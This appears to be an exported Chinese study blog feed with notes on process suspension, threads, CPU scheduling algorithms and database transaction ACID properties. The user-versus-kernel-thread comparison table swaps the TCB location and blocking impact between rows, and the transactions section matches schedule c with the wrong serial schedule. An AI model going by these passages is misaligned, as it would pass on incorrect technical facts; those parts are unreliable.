<h2 id="进程挂起"><a href="#进程挂起" class="headerlink" title="进程挂起"></a>进程挂起</h2><p>处在挂起状态的进程映像在磁盘上，目的是减少进程占用内存</p>
<ul>
<li><strong>等待挂起状态(Blocked-suspend)</strong><ul>
<li>进程在外存并等待某事件的出现</li>
</ul>
</li>
<li><strong>就绪挂起状态(Ready-suspend)</strong><ul>
<li>进程在外存，但只要进入内存即可运行 (内存空间不够或它的优先级不够高)</li>
</ul>
</li>
<li>挂起(Suspend) 把一个进程从内存转到外存<ul>
<li><strong>等待到等待挂起</strong> 没有进程处于就绪状态或就绪状态进程的内存要求无法满足</li>
<li><strong>就绪到就绪挂起</strong> 当有高优先级等待进程和低优先级就绪进程，系统会认为高优先级的等待进程会很快就绪，就把低优先级的就绪进程挂起，使得高优先级的等待进程被激活后有足够的内存</li>
<li><strong>运行到就绪挂起</strong> 对抢先式分时系统，当有高优先级等待挂起进程因事件出现而进入就绪状态，然而当前没有足够内存空间，它就会把当前正在运行的这个进程变成就绪挂起状态</li>
</ul>
</li>
<li>激活(Activate) 把一个进程从外存转到内存<ul>
<li><strong>就绪挂起到就绪</strong> 没有就绪队列或挂起就绪队列进程优先级高于就绪进程</li>
<li><strong>等待挂起到等待</strong> 当一个进程释放足够内存，并有高优先级等待挂起进程</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/28/5d3cee2fbccb943951.png"></p>
<blockquote>
<p>内存中的什么内容放到外存中，就算是挂起状态？</p>
</blockquote>
<p>进程内核栈被放到外存（ucore中没有挂起状态）</p>
<h2 id="状态队列"><a href="#状态队列" class="headerlink" title="状态队列"></a>状态队列</h2><p>由操作系统来维护一组队列，表示系统中所有进程的当前状态</p>
<ul>
<li>不同队列表示不同状态</li>
<li>根据进程状态不同 进程PCB加入相应队列</li>
</ul>
<p>操作系统来维护一组队列，表示系统中所有进程的当前状态，有关管理进程的描述正确的是（）</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 就绪态进程维护在进程就绪队列中</li>
<li><input checked="" disabled="" type="checkbox"> 等待态进程维护在进程等待队列中</li>
<li><input disabled="" type="checkbox"> 运行态进程维护在进程运行队列中</li>
<li><input disabled="" type="checkbox"> zombie态进程不在任何队列中</li>
</ul>
<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>在进程内部增加一类实体，满足以下特性：</p>
<ul>
<li>实体之间可以并发运行</li>
<li>实体之间共享相同的地址空间</li>
</ul>
<p>这种实体就是线程。</p>
<p>线程是进程的一部分，描述指令流执行状态。是进程中的指令执行最小单元，是 CPU 调度的基本单位。</p>
<h2 id="线程与进程的关系"><a href="#线程与进程的关系" class="headerlink" title="线程与进程的关系"></a>线程与进程的关系</h2><p><strong>进程</strong> 资源分配</p>
<p>进程由一组相关资源构成，包括地址空间(代码、数据段)、打开文件等各种资源</p>
<p><strong>线程</strong> 处理机调度</p>
<p>线程描述在进程资源环境中的指令流执行状态(现场保护，切换)</p>
<p>线程 = 进程 - 共享资源 = 执行流</p>
<p><strong>线程的优点</strong></p>
<ul>
<li>一个进程中可以有多个线程</li>
<li>各个线程之间可并发执行</li>
<li>各个线程之间可以共享地址空间和文件等资源</li>
</ul>
<p><strong>线程的缺点</strong></p>
<ul>
<li>一个线程崩溃会导致其所属进程的所有线程崩溃</li>
</ul>
<p><strong>线程与进程的比较</strong></p>
<ul>
<li>进程是资源分配单位，线程是CPU调度单位</li>
<li>进程拥有一个完整的资源平台，而线程只独享指令流执行的必要资源(保存信息少，切换速度快)，如寄存器、栈</li>
<li>线程具有就绪、等待 、运行三种基本状态和状态间的状态转换，与进程完全一致。</li>
<li>线程能减少并发执行的时间和空间开销<ul>
<li>一个进程内部线程的创建和结束时间比进程短，且同一进程内的线程切换时间比进程短</li>
<li>同一进程的各线程间共享内存和文件资源可不通过内核进行直接通信</li>
</ul>
</li>
</ul>
<p><strong>线程的三种实现方式</strong></p>
<ul>
<li><strong>用户线程</strong> 在用户空间实现</li>
<li><strong>内核线程</strong> 在内核中实现</li>
<li><strong>轻权进程</strong> 在内核中实现,支持用户线程,用户线程和内核线程的综合</li>
</ul>
<h2 id="用户线程"><a href="#用户线程" class="headerlink" title="用户线程"></a>用户线程</h2><p>由一组用户级的线程库函数来完成线程的管理，包括线程的创建、终止、同步、调度等</p>
<p><strong>用户线程的特征</strong></p>
<p>不依赖于操作系统内核</p>
<ul>
<li>内核不了解用户线程的存在</li>
<li>可用于不支持线程的多进程操作系统</li>
</ul>
<p>在用户空间实现的线程机制</p>
<ul>
<li>每个进程有私有的线程控制块(TCB) 列表</li>
<li>TCB由线程库函数维护</li>
</ul>
<p>同一进程内的用户线程切换速度快</p>
<ul>
<li>无需内核态、用户态的切换</li>
</ul>
<p>允许每个进程拥有自己的线程调度算法</p>
<p><strong>用户线程的不足</strong></p>
<ul>
<li>线程发起系统调用而阻塞时，则整个进程进入等待</li>
<li>不支持基于线程的处理机抢占(除非当前运行线程主动放弃，它所在进程的其他线程无法抢占CPU)</li>
<li>线程只能按进程分配 CPU时间(多个线程的进程中 每个线程的时间片少)</li>
</ul>
<h2 id="内核线程"><a href="#内核线程" class="headerlink" title="内核线程"></a>内核线程</h2><p>由内核通过系统调用实现的线程机制，由内核完成线程的创建、终止、管理</p>
<p><strong>内核线程的特征</strong></p>
<ul>
<li>由内核来维护PCB和TCB</li>
<li>线程执行系统调用而被阻塞不影响其他线程</li>
<li>线程的创建、终止、切换开销大(通过系统调用/内核函数在内核实现，涉及到栈的切换)</li>
<li>以线程为单位进行CPU时间分配(多线程的进程可获得更多的CPU时间)</li>
</ul>
<blockquote>
<p>用户线程与内核线程的区别是什么？</p>
</blockquote>
<p>用户线程是由函数库在用户态实现的线程机制；</p>
<p>内核线程是由内核通过系统调用实现的线程机制；</p>
<p>区别：</p>
<table>
<thead>
<tr>
<th></th>
<th>实现方式</th>
<th>TCB的保存位置</th>
<th>运行开销</th>
<th>线程阻塞的影响范围</th>
</tr>
</thead>
<tbody><tr>
<td>内核线程</td>
<td>内核系统调用</td>
<td>用户空间</td>
<td>大</td>
<td>整个进程</td>
</tr>
<tr>
<td>用户线程</td>
<td>用户态函数库</td>
<td>内核空间</td>
<td>小</td>
<td>不影响其他线程</td>
</tr>
</tbody></table>
<h2 id="轻权进程"><a href="#轻权进程" class="headerlink" title="轻权进程"></a>轻权进程</h2><p>**内核支持的用户线程 **一个进程可有一个或多个轻量级进程 每个轻权进程由一个单独的内核线程来支持。</p>
<h2 id="用户线程和内核线程的对应关系"><a href="#用户线程和内核线程的对应关系" class="headerlink" title="用户线程和内核线程的对应关系"></a>用户线程和内核线程的对应关系</h2><p><img src="https://i.loli.net/2019/07/28/5d3cf30a1c8d467856.png"></p>
<ul>
<li>内核线程(多进程多线程操作系统)：一对一</li>
<li>用户线程(多进程单线程操作系统)：多对一</li>
<li>轻权进程：多对多</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>处理机调度</title>
    <url>/systems/sched/</url>
    <content><![CDATA[<p> 执行多任务的计算机必然会涉及到进程切换的问题，进程切换也是CPU当前使用者的切换，下一个使用CPU运行的进程或线程则由处理及调度来完成。与页面置换算法不同，调度策略有不一致的目标比如响应时间、吞吐量、公平性。针对不同目标，设计了不同的调度算法，各有优劣之处，无法兼顾各个指标。</p>
<a id="more"></a>

<h1 id="CPU资源的时分复用"><a href="#CPU资源的时分复用" class="headerlink" title="CPU资源的时分复用"></a>CPU资源的时分复用</h1><p><strong>进程切换</strong> CPU资源的当前占用者的切换</p>
<ul>
<li>保存当前进程在 PCB中的执行上下文(CPU状态)</li>
<li>恢复下一个进程的执行上下文</li>
</ul>
<p><strong>处理机调度</strong></p>
<ul>
<li>选线程：从就绪队列中挑选出下一个占用CPU运行的线程</li>
<li>选CPU:  从多个可用CPU中挑选就绪进程可使用的CPU资源</li>
</ul>
<p> <strong>调度程序</strong> 挑选就绪进程的内核函数，若为多处理系统，则还需挑选处理机</p>
<h1 id="调度时机"><a href="#调度时机" class="headerlink" title="调度时机"></a>调度时机</h1><p>内核运行调度程序的条件</p>
<ul>
<li>进程从运行状态切换到等待状态 (等待某个事件的发生)</li>
<li>进程结束</li>
</ul>
<p><strong>非抢占系统</strong></p>
<p>占用CPU运行的进程的主动放弃（退出、等待）</p>
<p><strong>可抢占系统</strong></p>
<ul>
<li>中断请求被服务例程响应完成时<ul>
<li>进程从运行状态切换到就绪状态</li>
</ul>
</li>
<li>当前进程被抢占<ul>
<li>进程时间片用完</li>
<li>某更高优先级进程从等待状态切换到就绪状态</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/28/5d3d00e7554e429648.png"></p>
<h1 id="调度策略"><a href="#调度策略" class="headerlink" title="调度策略"></a>调度策略</h1><p>调度策略用于从就绪队列中选择下一个执行进程(与调度目标有关)。</p>
<p><strong>调度算法</strong> 在调度程序中实现的调度策略</p>
<p><strong>处理机资源使用模式特征</strong></p>
<p>进程在CPU计算和I/O操作(CPU处于等待状态)交替</p>
<ul>
<li>在时间片机制下，进程可能在结束当前CPU计算前被迫放弃CPU</li>
<li>应选择一个合适的时间尺度来作为时间片的基本单位</li>
<li>交替执行，每次执行时间很短，占用CPU执行指令的时间长度分布多数在10ms以内。</li>
</ul>
<h1 id="比较调度算法的准则"><a href="#比较调度算法的准则" class="headerlink" title="比较调度算法的准则"></a>比较调度算法的准则</h1><p>与之前的页面置换算法不同，比较调度算法的准则并不一致，分为以下几种，</p>
<ul>
<li>CPU利用率<ul>
<li>CPU 处于忙状态的时间百分比</li>
</ul>
</li>
<li>吞吐量<ul>
<li>单位时间内完成的进程数量</li>
</ul>
</li>
<li>周转时间<ul>
<li>进程从初始化到结束(包括等待)的总时间</li>
</ul>
</li>
<li>等待时间<ul>
<li>进程在就绪队列中的总时间，缩小就绪时间</li>
</ul>
</li>
<li>响应时间<ul>
<li>从提交请求到产生响应所花费的总时间(延迟)</li>
</ul>
</li>
</ul>
<h1 id="处理机调度策略的目标"><a href="#处理机调度策略的目标" class="headerlink" title="处理机调度策略的目标"></a>处理机调度策略的目标</h1><h2 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h2><p>响应时间时操作系统的计算延迟。</p>
<ul>
<li>减少响应时间<ul>
<li>及时处理用户的输入请求 尽快将输出反馈给用户</li>
</ul>
</li>
<li>减少平均响应时间的波动<ul>
<li>在交互系统中 可预测性比高差异低平均更重要</li>
</ul>
</li>
</ul>
<h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p>吞吐量是操作系统的计算带宽(单位时间内执行进程数)。</p>
<ul>
<li>增加吞吐量<ul>
<li>减少开销(操作系统开销 上下文切换)</li>
<li>提高系统资源的利用率(CPU 、I/O设备)</li>
</ul>
</li>
<li>减少等待时间<ul>
<li>减少每个进程的等待时间</li>
</ul>
</li>
</ul>
<h2 id="公平性"><a href="#公平性" class="headerlink" title="公平性"></a>公平性</h2><ul>
<li>保证每个进程的等待时间相同</li>
<li>保证每个进程占用CPU时间相同</li>
<li>公平通常会增加平均响应时间，会由开销来保证公平</li>
</ul>
<h1 id="传统调度算法"><a href="#传统调度算法" class="headerlink" title="传统调度算法"></a>传统调度算法</h1><p><strong>就绪队列排列顺序</strong></p>
<ul>
<li>先来先服务算法<ul>
<li>FCFS: First Come, First Served</li>
</ul>
</li>
<li>短进程优先算法(考虑进程特征)<ul>
<li>SPN: Shortest Process Next</li>
<li>SJF: Shortest Job First(短作业优先算法)</li>
<li>SRT: Shortest Remaining Time(短剩余时间优先算法)</li>
</ul>
</li>
<li>最高响应比优先算法 (进程在就绪队列里的等待时间)<ul>
<li>HRRN: Highest Response Ratio Next</li>
</ul>
</li>
</ul>
<p><strong>时间长短控制</strong></p>
<ul>
<li>时间片轮转算法 (轮流，先来先服务)<ul>
<li>RR: Round Robin</li>
</ul>
</li>
</ul>
<p><strong>多种算法综合</strong></p>
<ul>
<li>多级反馈队列算法 (将就绪队列分成不同子序列，不同队列使用不同的算法)<ul>
<li>MLFQ: Multilevel Feedback Queues</li>
</ul>
</li>
<li>公平共享调度算法 (按照进程占用的资源来调度)<ul>
<li>FSS: Fair Share Scheduling</li>
</ul>
</li>
</ul>
<h2 id="先来先服务算法"><a href="#先来先服务算法" class="headerlink" title="先来先服务算法"></a>先来先服务算法</h2><p><strong>先来先服务算法(FCFS First Come, First Served)</strong> </p>
<p>依据进程进入就绪队列的先后顺序排列</p>
<ul>
<li>进程进入等待或结束状态时 就绪队列中下一个进程占用CPU(主动让出)</li>
</ul>
<p><strong>FCFS算法的周转时间</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3d5f6bc76fe78757.png"></p>
<p>从例子中可以看出：周转时间跟队列到达时间有很大关系。</p>
<p><strong>先来先服务算法的特征</strong></p>
<p>优点</p>
<ul>
<li>简单</li>
</ul>
<p>缺点</p>
<ul>
<li>平均等待时间波动较大</li>
<li>I/O资源和CPU资源利用率较低 (未考虑到I/O和CPU并行)</li>
</ul>
<h2 id="短进程优先算法"><a href="#短进程优先算法" class="headerlink" title="短进程优先算法"></a>短进程优先算法</h2><p><strong>短进程优先算法(SPN Shortest Process Next)</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3d608c131df35716.png"></p>
<p><strong>短剩余时间优先算法(SRT short remaining time)</strong></p>
<p>若进程执行过程中有新进程进入就绪队列，预期执行时间比当前进程剩余执行时间段，则允许其抢占正在执行的进程(被动)。</p>
<p><strong>周转时间</strong></p>
<p>SPN算法具有最优平均周转时间，具体证明如下所示：</p>
<p><img src="https://i.loli.net/2019/07/28/5d3d619c46aa437160.png"></p>
<p><strong>短进程优先算法的特征</strong></p>
<ul>
<li>可能导致饥饿<ul>
<li>连续的短进程流会使长进程无法获得CPU资源</li>
</ul>
</li>
<li>如何预测下一个CPU计算的持续时间<ul>
<li>询问用户 用户欺骗就杀死相应进程</li>
<li>用过去预测未来</li>
</ul>
</li>
</ul>
<p><strong>执行时间预估</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">τ(n+1) &#x3D; αt(n)+(1-α)τ(n)，其中 0≤α≤1</span><br><span class="line">t(n)——第n次的CPU计算时间</span><br><span class="line">τ(n+1)&#x3D;αt(n)+(1-α)αt(n-1)+(1-α)(1-α)αt(n-2)+…</span><br></pre></td></tr></table></figure>
<p>预估CPU时间会越来越接近实际CPU执行时间(近似拟合)。</p>
<h2 id="最高响应比优先算法"><a href="#最高响应比优先算法" class="headerlink" title="最高响应比优先算法"></a>最高响应比优先算法</h2><p><strong>最高响应比优先算法(HRRN Highest Response Ratio Next)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R &#x3D; (w + s) &#x2F; s</span><br><span class="line">w: 等待时间(waiting time)</span><br><span class="line">s: 执行时间(service time)</span><br></pre></td></tr></table></figure>
<p>选择就绪队列中响应比R值最高的进程</p>
<ul>
<li>基于短进程优先算法的改进，但是不可抢占</li>
<li>关注进程等待时间</li>
<li>防止无限期推迟</li>
</ul>
<h2 id="时间片轮转算法"><a href="#时间片轮转算法" class="headerlink" title="时间片轮转算法"></a>时间片轮转算法</h2><p><strong>时间片轮转算法(Round Robin)</strong></p>
<p>将时间片作为分配处理机资源的基本时间单元。在时间片结束时，按 FCFS(先来先服务)算法切换到下一个就绪进程。</p>
<ul>
<li>每隔(n-1)个时间片进程执行一个时间片</li>
</ul>
<p>以时间片为20的RR算法为例：</p>
<p>周转时间=等待时间+执行时间</p>
<p><img src="https://i.loli.net/2019/07/28/5d3d64997672476756.png"></p>
<p><strong>时间片轮转算法特征</strong></p>
<p>有额外的上下文切换开销 </p>
<ul>
<li>当时间片太大时<ul>
<li>等待时间过长</li>
<li>极端情况下退化成 FCFS</li>
</ul>
</li>
<li>当时间片太小时<ul>
<li>反应迅速 但产生大量的上下文切换</li>
<li>大量上下文切换开销影响系统的吞吐量(单位时间内 运行的总进程数)</li>
</ul>
</li>
<li>时间片长度选择目标<ul>
<li>选择一个合适的时间片长度</li>
<li>维持上下文开销处于1%以内</li>
</ul>
</li>
</ul>
<p><strong>多级队列调度算法(MQ Multilevel Queues)</strong></p>
<p>就绪队列被划分为多个独立的子序列 (分前台后台)</p>
<p>每个队列拥有自己的调度策略</p>
<p>队列间调度</p>
<ul>
<li><strong>固定优先级</strong> 可能导致饥饿</li>
<li><strong>时间片轮转</strong> 每个队列都得到一个确定的能够调度其进程的CPU总时间</li>
</ul>
<p><strong>多级反馈队列算法(MLFQ Multilevel Feedback Queues)</strong></p>
<p>进程可在不同队列间移动的多级队列算法</p>
<ul>
<li>时间片大小随优先级级别增加而增加</li>
<li>进程在当前时间片没有完成 则降到下一优先级</li>
</ul>
<p><strong>多级反馈队列算法特征</strong></p>
<ul>
<li>CPU密集型进程的优先级会下降的很快</li>
<li>I/O密集型进程保留在高优先级</li>
</ul>
<p><strong>公平共享调度算法(FSS Fair Share Scheduling)</strong></p>
<p>FSS 控制用户对系统资源的访问</p>
<ul>
<li><p>一些用户组比其他用户组更重要</p>
</li>
<li><p>保证不重要的组无法垄断资源</p>
</li>
<li><p>未使用的资源按比例分配 </p>
</li>
<li><p>没有达到资源使用率目标的组获得更高优先级</p>
</li>
</ul>
<h2 id="传统调度算法总结"><a href="#传统调度算法总结" class="headerlink" title="传统调度算法总结"></a>传统调度算法总结</h2><blockquote>
<p>先来先服务算法(FCFS)</p>
</blockquote>
<ul>
<li>不公平 平均等待时间变动大</li>
</ul>
<blockquote>
<p>短进程优先算法(SPN)</p>
</blockquote>
<ul>
<li>不公平 平均周转时间最小</li>
<li>需要精确的预测执行时间</li>
<li>可能导致饥饿</li>
</ul>
<blockquote>
<p>最高响应比优先算法(HRRN)</p>
</blockquote>
<ul>
<li>基于 SPN调度(关注等待时间)</li>
<li>不可抢占</li>
</ul>
<blockquote>
<p>时间片轮转算法(RR)</p>
</blockquote>
<ul>
<li>公平 平均等待时间较差 交互比较好</li>
</ul>
<blockquote>
<p>多级反馈队列算法(MLFQ)</p>
</blockquote>
<ul>
<li>多种算法的集合(在实际系统中所使用)</li>
</ul>
<blockquote>
<p>公平共享调度(FSS)</p>
</blockquote>
<ul>
<li>公平</li>
</ul>
<h1 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h1><p>正确性依赖于其时间和功能两方面的操作系统</p>
<ul>
<li>实时操作系统的性能指标<ul>
<li>时间约束的及时性(deadlines)</li>
<li>速度和平均性能相对不重要</li>
</ul>
</li>
<li>实时操作系统的特性<ul>
<li>时间约束的可预测性</li>
</ul>
</li>
</ul>
<p><strong>实时操作系统分类</strong></p>
<ul>
<li>强实时操作系统<ul>
<li>要求在指定时间内必须完成重要的任务</li>
</ul>
</li>
<li>弱实时操作系统<ul>
<li>重要进程有高优先级，但并非必须完成</li>
</ul>
</li>
</ul>
<p><strong>实时任务</strong></p>
<ul>
<li>任务(工作单元)<ul>
<li>一次计算，一次文件读取，一次信息传递等</li>
</ul>
</li>
<li>任务属性<ul>
<li>完成任务所需要的资源</li>
<li>规定时间</li>
</ul>
</li>
</ul>
<p><strong>周期实时任务</strong></p>
<p>一系列相似的任务</p>
<ul>
<li>任务有规律地重复</li>
<li>周期p = 任务请求时间间隔 (0 &lt; p)</li>
<li>执行时间e = 最大执行时间(0 &lt; e &lt; p)</li>
<li>使用率U = e / p</li>
</ul>
<p><strong>硬时限和软时限</strong></p>
<p>硬时限和软时限对时间要求宽松程度不同，所以应对策略也有所不同。</p>
<ul>
<li>硬时限(Hard deadline)<ul>
<li>错过任务时会导致灾难性或非常严重的后果</li>
<li>必须验证在最坏的情况下能够满足时限</li>
</ul>
</li>
<li>软时限(Soft deadline)<ul>
<li>通常能满足任务时限，若不满足则降低要求</li>
<li>尽力满足任务时限</li>
</ul>
</li>
</ul>
<p><strong>可调度性</strong></p>
<p>可调度表示一个实时操作系统能够满足任务时限要求</p>
<ul>
<li>需要确定实时任务的执行顺序</li>
<li>静态优先级调度(执行前确定执行顺序)<ul>
<li>速率单调调度算法(RM: Rate Monotonic)</li>
</ul>
</li>
<li>动态优先级调度(执行时确定执行顺序) <ul>
<li>最早截止时间优先算法(EDF: Earliest Deadline First)</li>
</ul>
</li>
</ul>
<h1 id="多处理机调度"><a href="#多处理机调度" class="headerlink" title="多处理机调度"></a>多处理机调度</h1><p><strong>多处理机的特征</strong></p>
<ul>
<li>多个处理机组成一个多处理机系统</li>
<li>处理机间可负载共享</li>
</ul>
<p><strong>对称多处理器(SMP Symmetric multiprocessing)调度</strong></p>
<ul>
<li>截止时间越早 优先级越高 每个处理器运行自己的调度程序</li>
<li>调度程序对共享资源的访问需要进行同步</li>
</ul>
<p><strong>对称多处理器进程分配</strong></p>
<ul>
<li>静态进程分配<ul>
<li>进程从开始到结束都被分配到一个固定的处理机上执行</li>
<li>每个处理机有自己的就绪队列，刚开始队列分配后就不再切换就绪队列</li>
<li>调度开销小</li>
<li>各处理机可能忙闲不均</li>
</ul>
</li>
<li>动态进程分配<ul>
<li>进程在执行中可分配到任意空闲处理机上执行</li>
<li>所有处理机共享一个就绪队列</li>
<li>调度开销大</li>
<li>各处理机的负载是均衡的</li>
</ul>
</li>
</ul>
<h1 id="优先级反置"><a href="#优先级反置" class="headerlink" title="优先级反置"></a>优先级反置</h1><p>操作系统中出现高优先级进程长时间等待低优先级进程所占用资源的现象</p>
<ul>
<li>基于优先级的可抢占调度算法中存在优先级反置</li>
</ul>
<p><img src="https://i.loli.net/2019/07/28/5d3d6d38d183130897.png"></p>
<p>T2运行中申请T1已经占用的资源，但是T1正在占用资源L1,释放之后T2才可以执行，这时候T3优先级比T1高，抢占T1进入运行状态，这时候就会出现高优先级的T2等待。</p>
<blockquote>
<p>如何解决优先级反置?</p>
</blockquote>
<ul>
<li>优先级继承(Priority Inheritance)</li>
<li>优先级天花板协议(Priority Ceiling Protocol)</li>
</ul>
<p><strong>优先级继承</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3d6b036e4d596984.png"></p>
<p><strong>优先级天花板协议</strong></p>
<p>占用资源的进程的优先级和所有可能申请该资源的进程的最高优先级相同</p>
<ul>
<li>不管是否发生等待，都提升占用资源进程的优先级</li>
<li>优先级高于系统中所有被锁定的资源的优先级上限，任务执行临界区时就不会被阻塞</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>事务</title>
    <url>/systems/transaction/</url>
    <content><![CDATA[<p>数据库管理系统的并发控制和恢复机制存在于数据库管理系统设计中的各个部分。并发控制确保在多个线程写入/读取时数据的正确性，而恢复机制确保数据库管理系统在系统突然断电后数据仍然正常。基于事务的特性，并发控制和恢复机制是数据库管理系统的重要部分。</p>
<a id="more"></a>

<p>事务是在数据库上执行一系列的一个或多个操作（例如SQL查询）以执行一些更高级别的功能。事务是数据库管理系统变化的基本单位。只执行部分事务是不允许的。</p>
<p>比如，从小明的账户转100元给小红</p>
<ul>
<li>检查小明是否有100元</li>
<li>小明的账户减少100元</li>
<li>小红的账户增加100元</li>
</ul>
<h1 id="简易设计"><a href="#简易设计" class="headerlink" title="简易设计"></a>简易设计</h1><p>可按照事务到达数据库管理系统顺序依次执行，同一时刻仅可以执行一个事务。</p>
<p>在事务开始之前，将整个数据库复制到一个新文件，之后的更改均在新文件上执行。</p>
<ul>
<li>写入成功时用新文件覆盖原有文件</li>
<li>写入失败时，删除新文件</li>
</ul>
<p>以上设计存在一定的问题，可允许相互独立的事务并发执行以提高执行效率。</p>
<p>任意交错的操作将会导致暂时不一致，系统必然会在某一时刻处于不一致状态。但是这样不一致的状态不可一直存在。事务的作用域仅限于数据库管理系统中，在数据库管理系统以外不可回滚，所以事务不可更改数据库系统以外的文件。</p>
<h1 id="ACID特性"><a href="#ACID特性" class="headerlink" title="ACID特性"></a>ACID特性</h1><p>事务可能在从数据库中检索到的数据中执行很多操作，但是数据库管理系统仅仅关注从数据库中读入/写入的数据。</p>
<p>我们将数据库定义为固定的数据集合，例如A,B,C。相应地，事务定义为读/写操作的序列。例如R(A),R(B)。事务是数据库管理系统对应用程序的抽象。</p>
<p>在SQL中，事务以BEGIN为开始，要么以COMMIT,要么以ABORT结束。</p>
<ul>
<li><strong>COMMIT</strong> 如果提交了，数据库管理系统要么保存所有的更改，要么放弃更改</li>
<li><strong>ABORT</strong> 如果失败，所有操作将取消，和之前并未执行这些操作一样</li>
</ul>
<h2 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h2><p>在事务中所有操作要么都执行，要么都不执行。</p>
<p>考虑以下两种情形</p>
<ol>
<li>从小明的账户中取出了100元后，数据库管理系统在转账时失败</li>
<li>从小明账户中转出100元后，系统关机</li>
</ol>
<p>以上事务执行后小明账户正确的数目应该是多少？</p>
<p>可通过以下两种方式来确保操作的原子性</p>
<ul>
<li><p><strong>日志</strong> </p>
<p>数据库管理系统记录所有的操作，在事务失败时取消失败事务的相关操作</p>
<p>在内存和磁盘中均存储取消的操作记录</p>
<p>目前大多数数据管理系统的方式，效率高</p>
</li>
<li><p><strong>不可见页</strong></p>
<p>数据库操作系统复制页，事务对这些页更改。仅当事务提交时这些页才对其余事务可见。</p>
</li>
</ul>
<h2 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h2><p>数据库表示的世界在逻辑上是正确的，所有对数据的查询也应得到正确的应答。</p>
<p>通过以下一致性来确保正确性：</p>
<p><strong>数据库一致性</strong></p>
<p>数据库准确地模拟了真实世界，符合完整性约束。</p>
<p>将来的事务可查看过去在数据库中提交的事务。</p>
<p><strong>事务一致性</strong></p>
<p>如果每个事务都是一致的，并且在事务开始时数据库是一致的，则可确保事务完成时数据库是一致的。</p>
<h2 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h2><p>用户提交事务，每个事务独立执行，互不干扰。</p>
<p>数据库管理系统通过交错事务的操作来实现并发。</p>
<p>并发模型即是如何决定从多个事务中决定合适的交错顺序。</p>
<ul>
<li><strong>消极型</strong> 首要的一点是不让问题出现</li>
<li><strong>乐观型</strong> 假定冲突很少见，在发生时再对冲突处理</li>
</ul>
<p>考虑以下情况，假定A,B中初始时刻均有1000元</p>
<p>T1从A的账户中转100元到B的账户，T2给两个账户6%的利息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                     T2</span><br><span class="line">BEGIN                  BEGIN</span><br><span class="line">A&#x3D;A-100                A&#x3D;A*1.06 </span><br><span class="line">B&#x3D;B+100                B&#x3D;B*1.06</span><br><span class="line">COMMIT                 COMMIT</span><br></pre></td></tr></table></figure>
<p>执行T1和T2的结果可能是什么呢？</p>
<p>可能有很多执行结果，但是A+B应该是$2000*1.06=2120$</p>
<p>若两个事务同时提交，无法确保T1一定在T2之前执行，反之亦然。但是最后的结果必须等同于按照一定顺序串行执行的这两个事务。</p>
<p>合理的结果可能为：</p>
<ul>
<li>$A=954,B=1166$</li>
<li>$A=960,B=1160$</li>
</ul>
<p>结果取决于A先执行还是B先执行。</p>
<p>调度a</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                     T2</span><br><span class="line">BEGIN                </span><br><span class="line">A&#x3D;A-100                </span><br><span class="line">B&#x3D;B+100                </span><br><span class="line">COMMIT                </span><br><span class="line">                       BEGIN</span><br><span class="line">                       A&#x3D;A*1.06 </span><br><span class="line">                       B&#x3D;B*1.06</span><br><span class="line">                       COMMIT</span><br></pre></td></tr></table></figure>
<p>执行后，$A=954,B=1166$</p>
<p>调度b</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                     T2</span><br><span class="line">                       BEGIN</span><br><span class="line">                       A&#x3D;A*1.06 </span><br><span class="line">                       B&#x3D;B*1.06</span><br><span class="line">                       COMMIT</span><br><span class="line">BEGIN                </span><br><span class="line">A&#x3D;A-100                </span><br><span class="line">B&#x3D;B+100                </span><br><span class="line">COMMIT                                      </span><br></pre></td></tr></table></figure>
<p>执行后，$A=960,B=1160$</p>
<p>交叉执行的调度同样正确，例如调度c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                     T2</span><br><span class="line">BEGIN                </span><br><span class="line">A&#x3D;A-100</span><br><span class="line">                       BEGIN</span><br><span class="line">                       A&#x3D;A*1.06</span><br><span class="line">B&#x3D;B+100                </span><br><span class="line">COMMIT</span><br><span class="line">                       B&#x3D;B*1.06</span><br><span class="line">                       COMMIT</span><br></pre></td></tr></table></figure>
<p>执行后结果为，$A=954,B=1166$</p>
<p>调度c和调度b最后的结果均满足$A+B=2120$，所以二者等价。</p>
<p>但是若T1和T2按照以下顺序执行，会得到错误的结果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                     T2</span><br><span class="line">BEGIN                </span><br><span class="line">A&#x3D;A-100</span><br><span class="line">                       BEGIN</span><br><span class="line">                       A&#x3D;A*1.06</span><br><span class="line">                       B&#x3D;B*1.06</span><br><span class="line">                       COMMIT</span><br><span class="line">B&#x3D;B+100                </span><br><span class="line">COMMIT</span><br></pre></td></tr></table></figure>
<p>$A=954,B=1060,A+B=2014$ 损失了106元。</p>
<p>如何判定调度是正确的呢？</p>
<p>如果调度等价于某个顺序的串行执行，则该调度是正确的。</p>
<ul>
<li><p>串行执行调度</p>
<p>不同事务的操作不交错的调度</p>
</li>
<li><p>等价执行调度</p>
<p>对于任何数据库状态来说，先执行前者和先执行后者的结果相同</p>
</li>
<li><p>可串行化调度</p>
<p>等价于某一事务串行执行的调度</p>
</li>
</ul>
<p>如果每个事务均可持久，每个串行调度也将是持久的。</p>
